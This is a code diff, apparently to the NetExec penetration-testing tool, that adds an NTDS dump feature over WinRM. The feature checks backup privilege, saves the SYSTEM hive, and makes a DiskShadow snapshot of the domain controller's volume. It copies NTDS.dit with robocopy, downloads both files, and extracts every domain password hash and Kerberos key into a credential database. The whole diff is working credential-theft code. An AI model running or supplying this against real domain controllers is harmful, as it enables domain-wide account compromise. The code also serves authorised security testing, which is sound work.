@@ -1,5 +1,8 @@
 import os
 import base64
+import contextlib
+import re
+import tempfile
 import traceback
 import requests
 import urllib3
@@ -14,17 +17,27 @@ from termcolor import colored
 
 from dploot.lib.utils import is_guid, is_credfile
 from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB
-from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
+from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes, NTDSHashes
 from impacket.uuid import bin_to_string
 
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.logger import highlight
-from nxc.helpers.misc import gen_random_string
+from nxc.helpers.misc import gen_random_string, validate_ntlm
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
 from nxc.paths import TMP_PATH
+from nxc.protocols.winrm.ntds import (
+    CLEANUP_COUNT_RE,
+    CLEANUP_DELETING_RE,
+    EXPOSE_CONFIRM_RE,
+    build_cleanup_script,
+    build_create_script,
+    build_delete_only_script,
+    parse_alias_guid,
+    read_ntds_path,
+)
 
 urllib3.disable_warnings()
 
@@ -302,6 +315,24 @@ class winrm(connection):
         if get_output:
             return result
 
+    def _run_cmd(self, cmd):
+        """Run a CMD command and return stdout, stderr, and exit code."""
+        try:
+            return self.conn.execute_cmd(cmd, encoding=self.args.codec)
+        except Exception as e:
+            if not (hasattr(e, "code") and e.code == 5):
+                raise
+            self.logger.debug(f"cmd shell invoke denied (code 5), retrying via PowerShell runspace: {e}")
+        escaped = cmd.replace("'", "''")
+        stdout, streams, _ = self.conn.execute_ps(f"cmd /c '{escaped}'; \"NXC_RC=$LASTEXITCODE\"")
+        # Native stderr arrives in PowerShell's error stream.
+        stderr = "\n".join(str(err) for err in (getattr(streams, "error", None) or []))
+        match = re.search(r"NXC_RC=(\d+)", stdout or "")
+        if not match:
+            raise RuntimeError(f"No exit code marker in the PowerShell fallback output for {cmd!r}")
+        stdout = re.sub(r"\r?\n?NXC_RC=\d+", "", stdout or "")
+        return stdout, stderr, int(match.group(1))
+
     def get_file(self, remote_path=None, download_path=None):
         remote_path = remote_path if remote_path else self.args.get_file[0]
         local_path = download_path if download_path else self.args.get_file[1]
@@ -404,6 +435,316 @@ class winrm(connection):
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
+
+    def ntds(self):
+        """Get NTDS.dit with DiskShadow and parse it using the SYSTEM hive."""
+        if not self._check_backup_privilege():
+            return
+
+        try:
+            stdout, _, rc = self._run_cmd("echo %TEMP%")
+            if rc != 0 or not stdout.strip():
+                self.logger.fail("Could not resolve the remote temp directory")
+                return
+            remote_temp = stdout.strip().splitlines()[-1]
+
+            run_id = gen_random_string(8).lower()
+            alias = f"vss{run_id}"
+            staging_dir = f"{remote_temp}\\nxc_{run_id}"
+            script_path = f"{staging_dir}\\create.dsh"
+            metadata_path = f"{staging_dir}\\metadata.cab"
+
+            _, stderr, rc = self._run_cmd(f'mkdir "{staging_dir}"')
+            if rc != 0:
+                self.logger.fail(f"Could not create staging directory: {stderr.strip()}")
+                return
+        except Exception as e:
+            self.logger.fail(f"Could not prepare the NTDS dump: {e}")
+            return
+
+        output_base = f"{self.output_file_template.format(output_folder='ntds')}_{run_id}"
+        local_ntds = f"{output_base}.dit"
+        local_system = f"{output_base}.system"
+
+        shadow_guid = None
+        drive_letter = None
+        exposed = False
+        ntds_ok = False
+        system_ok = False
+        try:
+            os.makedirs(os.path.dirname(output_base), exist_ok=True)
+            # Read the NTDS path from the saved hive because reg query may be denied.
+            _, _, reg_rc = self._run_cmd(f'reg save HKLM\\SYSTEM "{staging_dir}\\SYSTEM" /y')
+            if reg_rc != 0:
+                self.logger.fail("Could not save the SYSTEM hive")
+                return
+            system_ok = self._download(f"{staging_dir}\\SYSTEM", local_system, "SYSTEM")
+            if not system_ok:
+                return
+
+            ntds_path = self._get_ntds_location(local_system)
+            if not ntds_path:
+                self.logger.fail("Could not determine the NTDS database location (is this a Domain Controller?)")
+                return
+            self.logger.debug(f"NTDS database located at {ntds_path}")
+
+            drive_letter = self._pick_drive()
+            if not drive_letter:
+                return
+
+            if not self._upload(build_create_script(alias, ntds_path[:2], drive_letter, metadata_path), script_path):
+                return
+
+            self.logger.display("Creating DiskShadow snapshot...")
+            try:
+                stdout, stderr, ds_rc = self._run_cmd(f'diskshadow /s "{script_path}"')
+            except Exception as e:
+                self.logger.fail(f"Could not run DiskShadow: {e}. A snapshot may remain on the target")
+                return
+
+            # Keep the GUID if DiskShadow fails after creating the snapshot.
+            try:
+                shadow_guid = parse_alias_guid(stdout, alias)
+            except ValueError as e:
+                self.logger.fail(f"DiskShadow returned multiple snapshot GUIDs: {e}. A snapshot may remain on the target")
+                return
+
+            expose_matches = EXPOSE_CONFIRM_RE.findall(stdout)
+            exposed = len(expose_matches) == 1 and expose_matches[0].upper() == drive_letter
+
+            if ds_rc != 0:
+                self.logger.fail(f"DiskShadow returned exit code {ds_rc}")
+                for line in stdout.splitlines():
+                    if line.strip():
+                        self.logger.display(f"  [stdout] {line}")
+                for line in stderr.splitlines():
+                    if line.strip():
+                        self.logger.fail(f"  [stderr] {line}")
+                if shadow_guid is None:
+                    self.logger.fail("No snapshot GUID was found, so a snapshot may remain on the target")
+                return
+
+            if not shadow_guid:
+                self.logger.fail("No snapshot GUID was found in the DiskShadow output, so a snapshot may remain on the target")
+                return
+
+            if not exposed:
+                self.logger.fail(f"DiskShadow did not confirm that the snapshot was exposed on {drive_letter}:")
+                return
+
+            self.logger.display("Acquiring NTDS database and SYSTEM hive...")
+            ntds_dir = ntpath.dirname(ntds_path)[3:]
+            ntds_filename = ntpath.basename(ntds_path)
+            robocopy_src = f"{drive_letter}:\\{ntds_dir}" if ntds_dir else f"{drive_letter}:\\"
+            _, _, rob_rc = self._run_cmd(f'robocopy "{robocopy_src}" "{staging_dir}" "{ntds_filename}" /b /r:2 /w:1 /j')
+            # Robocopy considers exit codes 0 through 7 successful.
+            if rob_rc >= 8:
+                self.logger.fail(f"Could not copy {ntds_filename} from the snapshot (exit code {rob_rc})")
+                return
+
+            ntds_ok = self._download(f"{staging_dir}\\{ntds_filename}", local_ntds, ntds_filename)
+        except Exception as e:
+            self.logger.fail(f"Could not acquire NTDS.dit and the SYSTEM hive: {e}")
+            return
+        finally:
+            try:
+                self._ntds_cleanup(shadow_guid, drive_letter, exposed, staging_dir)
+            except Exception as e:
+                self.logger.fail(f"Cleanup failed: {e}")
+            if not (ntds_ok and system_ok):
+                # Remove only files downloaded by this run.
+                for partial, ok in ((local_ntds, ntds_ok), (local_system, system_ok)):
+                    if ok:
+                        with contextlib.suppress(OSError):
+                            os.unlink(partial)
+
+        if ntds_ok and system_ok:
+            self._dump_ntds(local_ntds, local_system, output_base)
+        else:
+            self.logger.fail("Could not download both the NTDS database and SYSTEM hive")
+
+    def _check_backup_privilege(self):
+        try:
+            stdout, _, _ = self._run_cmd("whoami /priv /fo csv /nh")
+        except Exception as e:
+            self.logger.fail(f"Could not check SeBackupPrivilege: {e}")
+            return False
+        for line in stdout.splitlines():
+            parts = [p.strip('"') for p in line.split('","')]
+            if len(parts) >= 3 and parts[0].upper() == "SEBACKUPPRIVILEGE":
+                if parts[2].upper() != "ENABLED":
+                    self.logger.display("SeBackupPrivilege is present but disabled. Continuing anyway.")
+                else:
+                    self.logger.success("SeBackupPrivilege confirmed")
+                return True
+        self.logger.fail("SeBackupPrivilege was not found... aborting...")
+        return False
+
+    def _get_ntds_location(self, system_hive):
+        """Read the configured NTDS database path from the saved SYSTEM hive."""
+        try:
+            return read_ntds_path(system_hive)
+        except Exception as e:
+            self.logger.debug(f"Could not parse the SYSTEM hive: {e}")
+            return None
+
+    def _pick_drive(self):
+        """Return the highest available drive letter from Z to D, or None."""
+        output = self.execute(
+            "[System.IO.DriveInfo]::GetDrives() | ForEach-Object { $_.Name }",
+            True,
+            shell_type="powershell",
+        )
+        if not output:
+            self.logger.fail("Could not enumerate the remote drives")
+            return None
+        occupied = {line.strip()[:2].upper() for line in output.splitlines() if line.strip()}
+        for letter in "ZYXWVUTSRQPONMLKJIHGFED":
+            if f"{letter}:" not in occupied:
+                self.logger.debug(f"Selected drive letter: {letter}:")
+                return letter
+        self.logger.fail("No free drive letter available between D: and Z:")
+        return None
+
+    def _upload(self, content, remote_path):
+        local_path = None
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", newline="", suffix=".dsh", delete=False) as tmp:
+                tmp.write(content)
+                local_path = tmp.name
+            self.conn.copy(local_path, remote_path)
+            return True
+        except Exception as e:
+            self.logger.fail(f"Could not upload script to {remote_path}: {e}")
+            return False
+        finally:
+            if local_path:
+                with contextlib.suppress(FileNotFoundError, OSError):
+                    os.unlink(local_path)
+
+    def _download(self, remote_path, local_path, label):
+        if os.path.exists(local_path):
+            self.logger.fail(f"Not downloading {label}: {local_path} already exists")
+            return False
+        try:
+            self.conn.fetch(remote_path, local_path)
+            return True
+        except Exception as e:
+            self.logger.fail(f"Could not download {label}: {e}")
+            with contextlib.suppress(OSError):
+                os.unlink(local_path)
+            return False
+
+    def _ntds_cleanup(self, shadow_guid, drive_letter, exposed, staging_dir):
+        """Remove the snapshot and staging files created by this run."""
+        cleanup_ok = False
+        if shadow_guid:
+            script = build_cleanup_script(drive_letter, shadow_guid) if exposed else build_delete_only_script(shadow_guid)
+            cleanup_path = f"{staging_dir}\\cleanup.dsh"
+            if self._upload(script, cleanup_path):
+                try:
+                    ds_stdout, _, ds_rc = self._run_cmd(f'diskshadow /s "{cleanup_path}"')
+                    m = CLEANUP_DELETING_RE.search(ds_stdout)
+                    guid_confirmed = m and m.group(1).upper() == shadow_guid.upper()
+                    count_confirmed = CLEANUP_COUNT_RE.search(ds_stdout)
+
+                    if ds_rc == 0 and guid_confirmed and count_confirmed:
+                        cleanup_ok = True
+                    else:
+                        self.logger.fail(f"Could not remove snapshot {{{shadow_guid}}}. Snapshot {{{shadow_guid}}} may remain on the target")
+                except Exception as e:
+                    self.logger.fail(f"Could not remove snapshot {{{shadow_guid}}}: {e}. Snapshot {{{shadow_guid}}} may remain on the target")
+            else:
+                self.logger.fail(f"Could not upload the cleanup script. Snapshot {{{shadow_guid}}} may remain on the target")
+
+        try:
+            _, _, rm_rc = self._run_cmd(f'rmdir /s /q "{staging_dir}"')
+            if rm_rc != 0:
+                self.logger.fail(f"Could not remove staging directory: {staging_dir}")
+                cleanup_ok = False
+        except Exception as e:
+            self.logger.fail(f"Could not remove staging directory {staging_dir}: {e}")
+            cleanup_ok = False
+        if cleanup_ok:
+            self.logger.success("Remote artifacts and shadow copy removed")
+
+    def _dump_ntds(self, ntds_file, system_file, output_filename):
+        """Parse the downloaded NTDS database using the SYSTEM hive."""
+        host_id = self.db.get_hosts(filter_term=self.host)[0][0]
+        printed_kerb_keys_banner = False
+
+        def add_hash(secret_type, secret, host_id):
+            nonlocal printed_kerb_keys_banner
+            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                self.logger.display("Kerberos keys:")
+                printed_kerb_keys_banner = True
+
+            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                add_hash.kerb_secrets += 1
+            else:
+                add_hash.nt_lm_secrets += 1
+
+            if self.args.enabled:
+                if "Enabled" in secret:
+                    secret = " ".join(secret.split(" ")[:-1])
+                    self.logger.highlight(secret)
+            else:
+                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
+                self.logger.highlight(secret)
+
+            # Store only current user NTLM hashes in the database.
+            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
+                if secret.find("\\") != -1:
+                    domain, clean_hash = secret.split("\\")
+                else:
+                    domain = self.domain
+                    clean_hash = secret
+
+                try:
+                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
+                    parsed_hash = f"{lmhash}:{nthash}"
+                    if validate_ntlm(parsed_hash):
+                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
+                        add_hash.added_to_db += 1
+                        return
+                    raise
+                except Exception:
+                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
+            else:
+                self.logger.debug("Dumped hash is a computer account, not adding to db")
+
+        add_hash.nt_lm_secrets = 0
+        add_hash.kerb_secrets = 0
+        add_hash.added_to_db = 0
+
+        NTDS = None
+        try:
+            bootkey = LocalOperations(system_file).getBootKey()
+            NTDS = NTDSHashes(
+                ntds_file,
+                bootkey,
+                isRemote=False,
+                history=self.args.history,
+                noLMHash=True,
+                useVSSMethod=True,
+                justNTLM=not self.args.kerberos_keys,
+                pwdLastSet=False,
+                resumeSession=None,
+                outputFileName=output_filename,
+                justUser=self.args.userntds or None,
+                printUserStatus=True,
+                perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
+            )
+            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
+            NTDS.dump()
+            ntds_outfile = f"{output_filename}.ntds"
+            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
+            if self.args.kerberos_keys:
+                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
+        except Exception as e:
+            self.logger.fail(e)
+        if NTDS is not None:
+            NTDS.finish()
 
     def dpapi(self):
         """
